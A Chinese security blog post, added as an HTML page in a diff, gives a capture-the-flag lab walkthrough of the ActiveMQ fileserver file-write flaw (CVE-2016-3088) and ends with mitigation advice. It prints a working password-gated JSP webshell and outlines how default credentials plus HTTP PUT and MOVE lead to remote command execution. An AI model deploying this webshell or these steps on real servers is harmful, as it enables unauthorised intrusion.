@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="ST0new">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="ActiveMQ任意文件写入漏洞分析溯源">
+  <meta property="og:description" content="一个ctfer，web渗透测试小白">
+  <meta property="og:site_name" content="ST0new的小站">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="ST0new的小站" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>ST0new的小站</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">ActiveMQ任意文件写入漏洞分析溯源</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/<your-github-username>">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By ST0new</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-10-04</span>
+            <span class="time">00:23:49</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/WEB安全/">WEB安全</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/http方法利用/">#http方法利用</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java</p>
+<a id="more"></a>
+
+<p>[TOC]</p>
+<h1 id="墨者学院"><a href="#墨者学院" class="headerlink" title="墨者学院"></a>墨者学院</h1><h2 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h2><h3 id="ActiveMQ任意文件写入漏洞分析溯源"><a href="#ActiveMQ任意文件写入漏洞分析溯源" class="headerlink" title="ActiveMQ任意文件写入漏洞分析溯源"></a>ActiveMQ任意文件写入漏洞分析溯源</h3><h4 id="ActiveMQ-简介"><a href="#ActiveMQ-简介" class="headerlink" title="ActiveMQ 简介"></a>ActiveMQ 简介</h4><p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java<br>的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0<br>及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
+<ol>
+<li>其使用率并不高</li>
+<li>文件操作容易出现漏洞</li>
+</ol>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
+<li><p>访问url</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567586846125.png" alt="1567586846125"></p>
+</li>
+<li><p>查找漏洞</p>
+<p>搜索发现存在CVE-2016-3088 漏洞，找到分析查看漏洞原因</p>
+<p>查询发现在ActiveMQ&lt;5.12.x版本存在fileserver 应用，可以通过fileserver写入文件（不解析jsp文件）通过移动到任意位置，就可以造成任意文件写入漏洞。</p>
+<blockquote>
+<p>文件写入的几种利用方式</p>
+<p> 1 写入webshell</p>
+<p> 2 写入 cron 或 ssh key</p>
+<p> 3 写入 jar 或 jetty.xml 等库和配置文件</p>
+<p> 写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh<br>key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p>
+</blockquote>
+</li>
+<li><p>漏洞利用</p>
+<p>尝试写入jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">有回显带密码验证的</span><br><span class="line">&lt;% </span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">请求url：http:<span class="comment">//ip:port/Shell/cmd2.jsp?pwd=023&amp;i=ls</span></span><br></pre></td></tr></table></figure>
+
+<p>通过burp访问，发现需要验证，需要登录，我们尝试登录，默认的ActiveMQ的账号和密码均为admin</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567588127893.png" alt="1567588127893"></p>
+<p>登录后查看http方法 ，发现没有put方法</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567588291964.png" alt="1567588291964"></p>
+<p>执行put方法 发现却上传成功了</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591713323.png" alt="1567591713323"></p>
+<p>接下来通过move移动到admin或api下，就可以解析jsp文件了， 查找他的绝对路径</p>
+<blockquote>
+<p>访问url：<a href="http://ip:port/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://ip:port/admin/test/systemProperties.jsp</a></p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567590906298.png" alt="1567590906298"></p>
+</blockquote>
+<p>通过move方法将jsp木马移动到admin或api下，进行解析</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591781595.png" alt="1567591781595"></p>
+<p>然后访问，可以执行命令，</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591882796.png" alt="1567591882796"></p>
+<p>这里就可以直接查看flag，但是找了半天没找到,最后在根目录找到了flag</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567592783859.png" alt="1567592783859"></p>
+</li>
+</ol>
+<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
+<li>ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</li>
+<li>通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</li>
+</ol>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/swyft/articles/5563732.html" target="_blank" rel="noopener">jsp一句话</a></p>
+<p><a href="https://www.jianshu.com/p/564fb8b54a67" target="_blank" rel="noopener">ActiveMQ任意文件写入漏洞</a></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
